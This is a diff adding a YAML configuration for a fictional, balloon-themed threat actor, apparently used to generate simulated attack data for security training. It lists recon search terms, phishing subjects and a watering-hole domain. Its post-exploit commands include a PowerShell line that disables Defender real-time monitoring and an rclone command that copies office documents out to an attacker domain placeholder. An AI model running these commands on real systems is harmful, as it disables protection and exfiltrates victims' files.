@@ -1,0 +1,91 @@
+name : AirForceOne
+effectiveness: 80
+count_init_passive_dns: 10
+max_wave_size: 3
+attacks:
+  - recon:browsing
+  - watering_hole:malware_delivery
+watering_hole_domains:
+  - blimpgoespop.com
+watering_hole_target_roles:
+  - Balloon Operations Analyst
+  - Balloon Pilot
+domain_themes:
+  - mission
+  - infiltrate
+  - intel
+  - surveil
+  - covert
+  - espionage
+  - undercover
+  - interrogate
+  - crypto
+  - deception
+  - sabotage
+  - extraction
+  - cipher
+  - bug
+sender_themes: 
+  - agent
+  - spy
+  - operative
+  - infiltrator
+  - asset
+  - handler
+  - double-agent
+  - mole
+  - undercover
+  - covert
+  - saboteur
+subjects:
+  - "Inquiry about hot air balloon rental for a private event"
+  - "Request for hot air balloon ride for a VIP client"
+  - "Invitation to showcase hot air balloon technology at a science and technology conference"
+  - "Inquiry About Balloon Flight Availability"
+  - "Quote Request for Balloon Flight Services"
+  - "Flight Booking Confirmation"
+  - "Request for Balloon Flight Itinerary"
+  - "Request for Balloon Flight Safety Records"
+  - "Request for Balloon Flight Insurance Information"
+  - "Request for Balloon Pilot Background Check Information"
+  - "Request for Balloon Service Provider's License and Credentials"
+recon_search_terms:
+  - balloon plot for world domination
+  - spy balloon blueprints
+  - weapons enabled balloons
+  - what OS do the balloons run?
+  - balloon blue screen of death
+  - project sky-high
+  - balloon administrtor passwordss
+file_names:
+  - Hot-Air-Balloon-Fleet-Overview.docx
+  - Routes-and-Destinations.docx
+  - Flight-Procedures-and-Safety-Information.docx
+  - Equipment-and-Supplies.docx
+  - Flight-Crew-Information.docx
+  - Balloon-Feedback-and-Surveys.docx
+  - Balloon-Maintenance-and-Repair-Logs.docx
+  - Balloon-Flight-Sales-and-Marketing-Reports.docx
+  - Balloon-Flight-Budget-and-Financial-Statements.docx
+  - Marketing-Materials-and-Brochures.docx
+tlds:
+  - com
+  - air
+spoofs_email: False
+malware:
+  - hindenburg
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
